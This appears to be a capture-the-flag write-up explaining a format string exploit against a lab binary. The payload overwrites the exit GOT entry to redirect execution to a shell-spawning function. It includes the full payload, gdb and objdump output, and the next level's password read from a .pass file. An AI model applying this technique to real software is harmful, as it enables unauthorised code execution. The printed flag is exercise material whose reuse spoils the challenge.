It's almost the same as before. But this time, we have an exit function so we cannot just jump by overriding stack addresses. \
But this `o` funtion execute `/bin/sh` through the `system` function call. \
So we want to jump there. So we need to find the address for the real exit funtion (as the exit address we got in gdb is the `plt` one). \
Let's do an objdump:
```shell
$ objdump -d ./level5 | grep -A5 -I5 exit
...
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
                                               |__ this is the address we want to override
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
...
```
lets exploit this:
```shell
$ # find where our buffer is written in memory:
$ python -c 'print "AAAA" + " %p" * 6' | ./level5
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
$ # so we see here our A's written at location 4

$ # lets find the address of the 'o' function
$ gdb ./level5
(gdb) p o
$1 = {<text variable, no debug info>} 0x80484a4 <o>
```
Here, we see the address 0x080484a4, and the address for the exit function is 0x08049838. \
As the addresses are quite the same except for the 2 last bytes, we are going to write only those two bytes:
```shell
(gdb) p 0x84a4
$2 = 33956
(gdb) quit
$ python -c 'print "\x38\x98\x04\x08" + "%33952d%4$hn"' > /tmp/exploit
$ #                 |_ write to          |_ write 0x84a4 - 4 to the last 2 bytes (thats why we use the h modifier)

$ cat /tmp/exploit - | ./level5
...
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

